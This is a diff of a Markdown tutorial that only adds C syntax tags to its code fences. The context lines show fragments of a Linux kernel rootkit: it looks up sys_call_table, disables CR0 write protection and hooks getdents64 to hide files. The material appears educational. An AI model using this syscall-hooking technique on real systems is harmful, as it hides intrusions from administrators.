@@ -188,7 +188,7 @@ This change is part of a larger set of security improvements designed to protect
 
 <h4> Header: </h4>
 
-```
+```c
 #include <linux/module.h>
 #include <linux/sched.h>
 #include <linux/timer.h>
@@ -208,7 +208,7 @@ This change is part of a larger set of security improvements designed to protect
 
 <h4> Timer Callback Function </h4>
 
-```
+```c
 static void procmonitor_check_proc_tree(unsigned long unused)
 {
     int ret;
@@ -230,7 +230,7 @@ static void procmonitor_check_proc_tree(unsigned long unused)
 
 <h4> Go through all processes: </h4>
 
-```
+```c
 for_each_process(task)
     printk(KERN_INFO "process: %s, PID: %d\n", task->comm, task->pid);
 ```
@@ -238,7 +238,7 @@ for_each_process(task)
 
 <h4> Reset the Timer: </h4>
 
-```
+```c
 ret = mod_timer(&procmonitor_timer, jiffies + msecs_to_jiffies(2000));
 ```
 
@@ -246,7 +246,7 @@ ret = mod_timer(&procmonitor_timer, jiffies + msecs_to_jiffies(2000));
 
 <h4> Module Initialization </h4>
 
-```
+```c
 static int __init procmonitor_init(void)
 {
     int ret;
@@ -281,7 +281,7 @@ static int __init procmonitor_init(void)
 
 <h4> Module Finalization </h4>
 
-```
+```c
 static void __exit procmonitor_exit(void)
 {
     int ret;
@@ -314,7 +314,7 @@ And how does it hook the syscall?
 1) Find the Syscalls Table:
 
 The find_syscall_table function uses the kprobes module to find the address of the kernel syscall table (sys_call_table).
-```
+```c
 unsigned long *find_syscall_table(void)
 {
     typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
@@ -331,7 +331,7 @@ unsigned long *find_syscall_table(void)
 2) Unprotect Memory
 
 The unprotect_memory function disables write protection on the page containing the syscall table, allowing the rootkit to modify the syscall table.
-```
+```c
 static inline void unprotect_memory(void)
 {
     write_cr0_forced(cr0 & ~0x00010000);
@@ -341,7 +341,7 @@ static inline void unprotect_memory(void)
 
 In ghost_init, the address of the original getdents64 syscall is saved and replaced with the address of the hook function (hook_getdents64).
 
-```
+```c
 static int __init ghost_init(void)
 {
     __syscall_table = find_syscall_table();
@@ -364,7 +364,7 @@ static int __init ghost_init(void)
 
 After replacement, write protection is restored.
 
-```
+```c
 static inline void protect_memory(void)
 {
     write_cr0_forced(cr0);
@@ -374,7 +374,7 @@ static inline void protect_memory(void)
 
 The hook function hook_getdents64 intercepts calls to getdents64, checks file names, and hides any file named file_to_hide.
 
-```
+```c
 asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
     int ret = orig_getdents64(fd, dirp, count);
     struct linux_dirent64 *d, *kd, *kdirent = NULL;
@@ -412,7 +412,7 @@ asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, uns
 
 When unloading the module, the original syscall is restored:
 
-```
+```c
 static void __exit ghost_exit(void)
 {
     unprotect_memory();
